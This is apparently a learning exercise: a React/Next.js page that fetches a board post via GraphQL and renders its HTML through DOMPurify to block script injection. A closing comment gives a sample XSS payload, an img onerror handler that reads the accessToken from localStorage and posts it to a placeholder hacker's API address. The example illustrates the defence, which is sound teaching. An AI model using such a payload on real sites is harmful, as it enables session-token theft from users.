import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import {
  IQuery,
  IQueryFetchBoardArgs,
} from "../../../../src/commons/types/generated/types";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function WebEditorDetailPage() {
  const router = useRouter();
  const { data } = useQuery<Pick<IQuery, "fetchBoard">, IQueryFetchBoardArgs>(
    FETCH_BOARD,
    {
      variables: { boardId: String(router.query.id) },
    }
  );

  return (
    <div>
      {/* <div style={{ color: "pink" }}>작성자: {data?.fetchBoard.writer}</div>
      {process.browser && (
        <div style={{ color: "green" }}>제목: {data?.fetchBoard.title}</div>
      ): (<div style={{color: "green"}}/>)}
      <div style={{ color: "purple" }}>내용: {data?.fetchBoard.contents}</div> */}

      <div style={{ color: "pink" }}>작성자: {data?.fetchBoard.writer}</div>
      <div style={{ color: "green" }}>제목: {data?.fetchBoard.title}</div>
      {process.browser && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(String(data?.fetchBoard.contents)),
            //꺽쇠가 ㄱ들어왔을때 자동으로 차단해주는 library가 있음 (이 안에서 js가 실행되는걸 막아주는 dompurfy)
          }}
        ></div>
      )}
    </div>
  );
}

//<img src='#' onerror='console.log(const aaa = localStorage.getItem("accessToken")); axios.post(해커의API주소, {accessToken= aaa})'/>
